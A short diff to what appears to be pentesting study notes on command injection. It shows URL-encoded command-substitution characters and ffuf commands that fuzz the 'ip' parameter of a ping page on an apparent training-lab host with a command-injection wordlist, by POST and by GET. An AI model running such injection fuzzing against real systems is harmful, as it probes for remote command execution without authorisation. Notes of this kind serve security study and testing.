@@ -13,7 +13,9 @@ $()   %24%28%29
 ```
 
 ```shell
-ffuf -w ~/opt/wordlists/CMDi.txt -u http://adot8.com/ -X POST -d 'ip=127.0.0.1FUZZ' 
+ffuf -w ~/opt/wordlists/CMDi.txt -u http://monitoring.inlanefreight.local/ping.php -X POST -d 'ip=127.0.0.1FUZZ' 
+
+ffuf -w ~/opt/wordlists/CMDi.txt -u 'http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1FUZZ' 
 ```
 #### Payloads
 ```shell
